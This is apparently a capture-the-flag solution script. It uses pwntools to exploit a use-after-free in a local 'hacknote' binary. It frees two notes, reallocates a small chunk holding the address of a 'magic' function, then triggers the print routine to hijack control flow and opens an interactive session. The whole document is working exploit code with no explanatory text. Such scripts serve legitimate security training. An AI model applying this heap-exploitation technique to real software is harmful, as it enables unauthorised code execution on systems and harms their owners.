#!/usr/bin/env python
from pwn import *

r = process("./hacknote")

magic = 0x8048986
#write func for convenience
def add(size,content):
        r.recvuntil(":")
        r.sendline("1")
        r.recvuntil(":")
        r.sendline(str(size))
        r.recvuntil(":")
        r.sendline(content)

def de(index):
        r.recvuntil(":")
        r.sendline("2")
        r.recvuntil(":")
        r.sendline(str(index))

def pri(index):
        r.recvuntil(":")
        r.sendline("3")
        r.recvuntil(":")
        r.sendline(str(index))

add(40,"hello")   #0
add(40,"hello")   #1
de(0)
de(1)
add(8,p32(magic))
pri(0)
r.interactive()

